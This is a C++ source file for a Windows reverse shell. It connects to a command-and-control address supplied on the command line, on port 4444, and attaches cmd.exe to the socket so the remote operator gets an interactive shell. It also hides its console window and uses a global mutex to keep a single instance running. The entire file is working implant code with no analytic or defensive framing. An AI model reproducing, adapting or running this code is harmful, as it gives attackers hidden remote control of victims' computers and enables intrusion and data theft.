//cl.exe / EHsc ShellWithMutex.cpp

# include <iostream>
# include <WinSock2.h>
# include <ws2tcpip.h>
# include <windows.h>

# define MUTEX_NAME "GLOBAL\\IPC_MUTEX"
# pragma comment(lib, "ws2_32.lib")
# pragma comment(lib, "user32.lib")

using namespace std;

typedef struct Connection Connection;

struct Connection {
	WSADATA wsaData = { 0 };
	SOCKET clientSocket;
	sockaddr_in saddr;
	WORD wVersion;
	int err, conn;
}conn;


VOID LaunchShell() {
	// setup the shell
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	char shellPath [] = "C:\\Windows\\System32\\cmd.exe";

	// clean out the memory of structures
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));

	// setting startupinfo parameters
	si.cb = sizeof(si);
	si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)conn.clientSocket;

	if (CreateProcess(NULL, shellPath, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi) != 0) {
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	closesocket(conn.clientSocket);
	WSACleanup();
}

BOOL ConnInit(char *HOST, int PORT) {

	// Initialising WsaStartup
	conn.wVersion = MAKEWORD(2, 2);
	conn.err = WSAStartup(conn.wVersion, &conn.wsaData);

	if (conn.err != 0) {
		cout << "[-] WSAinit failed !!\n";
		WSACleanup();
		return FALSE;
	}

	// Initialising Wsasocket for communication
	conn.clientSocket = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, NULL);

	if (conn.clientSocket == INVALID_SOCKET) {
		cout << "[-] SocketInit Failed !!\n";
		closesocket(conn.clientSocket);
		WSACleanup();
		return FALSE;
	}

	conn.saddr.sin_family = AF_INET;
	conn.saddr.sin_addr.s_addr = inet_addr(HOST);
	conn.saddr.sin_port = htons(PORT);

	// connect to the server
	conn.conn = WSAConnect(conn.clientSocket, (SOCKADDR*)&conn.saddr, sizeof(conn.saddr), NULL, NULL, NULL, NULL);
	
	if (conn.conn == SOCKET_ERROR) {
		cout << "[-] Failed to connect !!\n";
		closesocket(conn.clientSocket);
		WSACleanup();
		return FALSE;
	}
	return TRUE;
}

BOOL IsRunning() {
	HANDLE mutexCheck;
	mutexCheck = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, MUTEX_NAME);
	if (mutexCheck == NULL) {
		return FALSE;
	}
	return TRUE;
}

int main(int argc, char* argv[])
{
	char* C2HOST = argv[1]; // C2IP as input via commandline
	int C2PORT = 4444; // C2PORT 
	
	HWND Console = GetConsoleWindow();
	ShowWindow(Console, SW_HIDE);
	
	if (IsRunning()) {
		cout << "Already running";
		return -1;
	}
	else {
		HANDLE Mutex = CreateMutexA(NULL, TRUE, MUTEX_NAME);
		ConnInit(C2HOST, C2PORT);
		LaunchShell();
	}
	
	return 0;
}
